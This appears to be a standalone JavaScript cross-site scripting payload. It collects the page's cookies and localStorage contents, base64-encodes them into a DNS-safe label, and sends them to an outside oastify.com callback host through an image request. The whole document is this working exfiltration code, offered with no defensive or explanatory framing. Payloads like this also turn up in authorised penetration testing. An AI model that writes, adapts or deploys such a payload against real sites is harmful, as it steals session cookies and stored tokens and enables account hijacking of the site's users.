(function() {
    // 1. Collect cookies and localStorage
    let dataToExfil = {
        cookie: document.cookie,
        localStorage: Object.assign({}, localStorage)
    };
    
    // 2. Convert to JSON, base64 encode, and make DNS-safe (replacing +, /, and padding)
    let base64Encoded = btoa(JSON.stringify(dataToExfil))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');

    // 3. Send to your external server via an Image request
    let exfilUrl = `https://${base64Encoded}.jk7ug4g6i6moy2wxo0jab50t9kfb365uu.oastify.com/`;
    new Image().src = exfilUrl;
})();
